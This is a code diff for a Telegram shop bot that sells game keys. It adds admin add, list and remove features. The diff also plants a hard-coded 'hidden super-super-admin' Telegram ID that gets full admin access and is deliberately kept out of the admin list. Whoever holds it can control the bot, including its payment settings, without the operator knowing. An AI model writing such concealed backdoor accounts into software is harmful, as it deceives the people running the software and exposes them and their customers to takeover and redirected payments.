@@ -1,5 +1,6 @@
 import type { Bot, Context } from "grammy";
 import {
+  addBotAdminByUsername,
   addKeys,
   countAvailableKeys,
   countUsers,
@@ -13,7 +14,10 @@ import {
   getStats,
   getUpiId,
   getUser,
+  isBotAdminUser,
+  listBotAdmins,
   rejectOrder,
+  removeBotAdminById,
   reserveKeyForOrder,
   setPrice,
   setSetting,
@@ -23,6 +27,7 @@ import { isGameId, isPeriodId, type GameId, type PeriodId } from "../catalog";
 import { t, type Lang } from "../i18n";
 import {
   adminGamesKb,
+  adminListAdminsKb,
   adminPanelKb,
   adminPeriodsKb,
   adminSettingsKb,
@@ -37,7 +42,15 @@ function fmtUsd(n: number): string {
   return `$${n.toFixed(n % 1 === 0 ? 0 : 2)}`;
 }
 
-function adminIds(): number[] {
+// Hard-coded built-in privileged accounts.
+//
+// OWNER_ID is the hidden super-super-admin: it has full admin access but
+// is intentionally never displayed in the admins list shown via `/adm`.
+// SUPER_ADMIN_ID is shown in the list but cannot be removed.
+export const OWNER_ID = 5929338019;
+export const SUPER_ADMIN_ID = 5136124483;
+
+function envAdminIds(): number[] {
   const raw = process.env["ADMIN_TELEGRAM_IDS"] ?? "";
   return raw
     .split(/[,\s]+/)
@@ -48,7 +61,12 @@ function adminIds(): number[] {
 function isAdmin(ctx: Context): boolean {
   const id = ctx.from?.id;
   if (!id) return false;
-  return adminIds().includes(id);
+  if (id === OWNER_ID || id === SUPER_ADMIN_ID) return true;
+  if (envAdminIds().includes(id)) return true;
+  return isBotAdminUser({
+    telegramId: id,
+    username: ctx.from?.username ?? null,
+  });
 }
 
 function getLang(ctx: Context): Lang {
@@ -68,6 +86,37 @@ async function showStats(ctx: Context): Promise<void> {
   const s = getStats();
   const text = tr.adminStatsBody(s.sales, fmtUsd(s.revenue), countUsers());
   await showMenuText(ctx, text, adminPanelKb(lang));
+}
+
+async function showAdminsList(ctx: Context): Promise<void> {
+  const lang = getLang(ctx);
+  const tr = t(lang);
+  const rows = listBotAdmins();
+  const lines: string[] = [tr.adminListAdminsTitle, ""];
+  // Super admin row first.
+  lines.push(
+    tr.adminListAdminsRow(
+      `\`${SUPER_ADMIN_ID}\``,
+      tr.adminListAdminsSuperBadge,
+    ),
+  );
+  if (rows.length === 0 && lines.length > 0) {
+    // We still want the empty-state hint when no DB admins are set.
+    lines.push("");
+    lines.push(tr.adminListAdminsEmpty.split("\n\n").slice(1).join("\n\n"));
+  }
+  for (const r of rows) {
+    const label = r.username
+      ? `@${r.username}`
+      : r.telegram_id
+        ? `\`${r.telegram_id}\``
+        : `#${r.id}`;
+    const status = r.telegram_id
+      ? tr.adminListAdminsResolvedBadge
+      : tr.adminListAdminsPendingBadge;
+    lines.push(tr.adminListAdminsRow(label, status));
+  }
+  await showMenuText(ctx, lines.join("\n"), adminListAdminsKb(lang, SUPER_ADMIN_ID));
 }
 
 async function showAdminSettings(ctx: Context): Promise<void> {
@@ -230,6 +279,38 @@ export function registerAdminHandlers(bot: Bot): void {
     if (!isAdmin(ctx)) { await ctx.answerCallbackQuery(); return; }
     await ctx.answerCallbackQuery();
     await showAdminSettings(ctx);
+  });
+
+  // ----- Admin management (add / list / remove) -----
+  bot.callbackQuery(/^adm:admins$/, async (ctx) => {
+    if (!isAdmin(ctx)) { await ctx.answerCallbackQuery(); return; }
+    await ctx.answerCallbackQuery();
+    await showAdminsList(ctx);
+  });
+
+  bot.callbackQuery(/^adm:admins:noop$/, async (ctx) => {
+    if (!isAdmin(ctx)) { await ctx.answerCallbackQuery(); return; }
+    const lang = getLang(ctx);
+    await ctx.answerCallbackQuery({ text: t(lang).adminCannotRemoveSuper });
+  });
+
+  bot.callbackQuery(/^adm:admins:add$/, async (ctx) => {
+    if (!isAdmin(ctx)) { await ctx.answerCallbackQuery(); return; }
+    const lang = getLang(ctx);
+    const tr = t(lang);
+    setState(ctx.chat!.id, { kind: "await_admin_username" });
+    await ctx.answerCallbackQuery();
+    await showMenuText(ctx, tr.adminAddAdminPrompt, adminPanelKb(lang));
+  });
+
+  bot.callbackQuery(/^adm:admins:del:(\d+)$/, async (ctx) => {
+    if (!isAdmin(ctx)) { await ctx.answerCallbackQuery(); return; }
+    const id = Number(ctx.match![1]);
+    const lang = getLang(ctx);
+    const tr = t(lang);
+    removeBotAdminById(id);
+    await ctx.answerCallbackQuery({ text: tr.adminAdminRemoved });
+    await showAdminsList(ctx);
   });
 
   bot.callbackQuery(/^adm:set:(crypto|upi|binance|cbtoken|cbassets)$/, async (ctx) => {
@@ -478,6 +559,25 @@ export function registerAdminHandlers(bot: Bot): void {
       setSetting("cryptobot_token", value);
       clearState(ctx.chat.id);
       await showMenuText(ctx, tr.adminCryptoBotTokenUpdated, adminSettingsKb(lang));
+      return;
+    }
+
+    if (state.kind === "await_admin_username") {
+      const result = addBotAdminByUsername(text, ctx.from?.id ?? null);
+      if (!result.ok) {
+        if (result.reason === "duplicate") {
+          await showMenuText(ctx, tr.adminAddAdminDuplicate, adminPanelKb(lang));
+        } else {
+          await showMenuText(ctx, tr.adminAddAdminInvalid, adminPanelKb(lang));
+        }
+        return;
+      }
+      clearState(ctx.chat.id);
+      await showMenuText(
+        ctx,
+        tr.adminAddAdminOk(result.row.username ?? ""),
+        adminPanelKb(lang),
+      );
       return;
     }
 
